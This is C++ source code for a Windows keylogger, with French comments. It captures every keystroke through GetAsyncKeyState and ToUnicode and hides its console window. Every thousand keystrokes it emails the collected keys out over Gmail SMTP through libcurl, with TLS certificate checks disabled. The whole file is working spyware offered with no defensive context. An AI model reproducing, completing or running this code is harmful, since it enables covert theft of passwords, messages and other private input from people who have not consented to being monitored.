#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <vector>
#include <curl/curl.h>

#define FROM    "<exemple0@gmail.com>"
#define TO      "<exemple@gmail.com>"

int limit = 1000;  //Caracter limit beforer the mail upload
int actualState = 0;    //Actual caracter
std::vector<std::string> keyList;   //Caracter storage

struct upload_status {
  size_t bytes_read; 
};

static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp) {
    std::string *upload_data = (std::string *)userp;
    
    if (upload_data->empty()) return 0;
    
    size_t copy_size = std::min(size * nmemb, upload_data->size());
    memcpy(ptr, upload_data->c_str(), copy_size);
    upload_data->erase(0, copy_size);
    
    return copy_size;
}

void sendEmail(const std::string& emailBody) {
    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    struct upload_status upload_ctx = {0};
    
    // Preparer le texte dynamique
    std::string dynamic_payload = 
        "To: " + std::string(TO) + "\r\n" +
        "From: " + std::string(FROM) + "\r\n" +
        "Subject: Key send\r\n\r\n" +
        emailBody + "\r\n";
    
    // Stocker le texte dans une variable persistante
    static std::string persistent_payload;
    persistent_payload = dynamic_payload;
    
    curl = curl_easy_init();
    if (curl) {
        // Parametres SMTP
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_USERNAME, "exemple0@gmail.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "mot de passe application");
        
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);
        
        recipients = curl_slist_append(recipients, TO);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        
        // Configuration CRUCIALE pour l'upload
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA, &persistent_payload);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        res = curl_easy_perform(curl);

        if (res != CURLE_OK)
            fprintf(stderr, "Erreur d'envoi: %s\n", curl_easy_strerror(res));
        else
            printf("Email envoye avec succes !\n");
        
        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }
}


bool IsKeyPressed(int vkey) {   //Une touche est presse ?
    return (GetAsyncKeyState(vkey) & 0x8000);   //retourne si une cles est presse
}

int specialKey(int vkey)   
{
    switch(vkey)
    {
        case VK_RETURN:         keyList.push_back(" [ENTER] \n");   actualState ++;     std::cout << " [ENTER] \n" ;            return 1;  break;
        case VK_DELETE:         keyList.push_back(" [DELETE] ");    actualState ++;     std::cout << " [DELETE] " ;             return 1;  break; 
        case VK_SPACE:          keyList.push_back(" [SPACE] ");     actualState ++;     std::cout << " [SPACE] ";               return 1;  break;
        case VK_TAB:            keyList.push_back(" [TAB] ");       actualState ++;     std::cout << " [TAB] ";                 return 1;  break;
        case VK_CONTROL:        keyList.push_back(" [CONTROL] ");   actualState ++;     std::cout << " [CONTROL] ";             return 1;  break;
        case VK_BACK:           keyList.push_back(" [BACK] ");      actualState ++;     std::cout << " [BACK] ";                return 1;  break;
        case VK_ESCAPE:         keyList.push_back(" [ESCAPE] ");    actualState ++;     std::cout << " [ESCAPE] ";              return 1;  break; 
        default:                                                                                                                return 0;  break;
    }
}

// Convertit un code virtuel en caractere (en tenant compte des majuscules/AltGr)
char VirtualKeyToChar(UINT vkey, bool shiftPressed, bool altGrPressed, bool capLockPressed) { //UINT vkey : convertit les cles virtuel en caractere
   
    BYTE keyboardState[256] = {0};  //Variable pour recuperer L'etat du clavier 
    WCHAR buffer[2] = {0}; //Le buffer va être un tableau recuperant les touches presse dans la fonction ToUnicode, c'est au moment ou la ligne de Tounicode est lance que la touche es recupere
    
    // Condition de recuperation de l'Etat pour connaitre si des touches special sont presse
    if (shiftPressed) keyboardState[VK_SHIFT] = 0x80;   //Si shift est presse alors, dans la position VK_shit du tableau de cle virtuel, la touche est egale a 0x80 pour indique qu'elle est presse
    if (capLockPressed) keyboardState[VK_CAPITAL] = 0x01; // 0x01, indique ici si la touche est verrouille 
    if (altGrPressed) {                 //AltGr est Utilise
        keyboardState[VK_CONTROL] = 0x80;
        keyboardState[VK_MENU] = 0x80;  // Alt = VK_MENU
    }
    
    int result = ToUnicode(vkey, 0, keyboardState, buffer, 2, 0);
    
    if (result == 1) // renvoie Unicode
    { 
        if(specialKey(vkey) == 0)  //La touche utilise n'est pas special alors  == à 0
        {
            return char(buffer[0]); //static_cast<char>(buffer[0]);
        } else return '\0';
    }
    else
    {
        return '\0'; // Aucun caractere ou touche non reconnue
    }
}


int main() {
    bool wasPressed[256] = {false}; //connaitre si une touche est bien en train d'être appuye
    FreeConsole();

    while (true) 
    {
        Sleep(10);
        for (int vkey = 0; vkey < 256; ++vkey) 
        {    //Parcours les touches possibles à appuyer
            if (IsKeyPressed(vkey) && !wasPressed[vkey]) 
            {   //Si une touche est bien appuye est que le tableau de touche presse renvoie faux
                wasPressed[vkey] = true;    // alors la touche presse du tableau devient vrai

                //Connaitre l'etat du clavier pour savoir quel touche va être presse
                bool shift = IsKeyPressed(VK_SHIFT);    //si shift est appuye alors vrai sinon faux
                bool altGr = IsKeyPressed(VK_CONTROL) && IsKeyPressed(VK_MENU); // AltGr = Ctrl + Alt ou simplement la touche altGr
                bool capLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                char c = VirtualKeyToChar(vkey, shift, altGr, capLock); //c est egale a se que retourne virtualKey
                if (c != '\0') 
                {
                    std::cout << c; // VK print : << " (VKey: " << vkey << ")" ;
                    std::string s(1, c);    //Char to string
                    keyList.push_back(s);   //push the string to the KeyList
                    actualState ++;
                } 
            }
            else if(IsKeyPressed(vkey) == false) wasPressed[vkey] = false;  //quand touche relacher alors on quitte la condition precedent et plus aucun 

            if (actualState >= limit) {
                std::string keyListStr;
                for (const auto& key : keyList) {
                    keyListStr += key;
                }
                
                std::string emailBody = "List of pressed keys:\n" + keyListStr;
                sendEmail(emailBody);
                
                keyList.clear();
                actualState = 0;
            }
        }
    }

    return 0;
}



/*
    Windows.h:
        ToUnicode: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicode

*/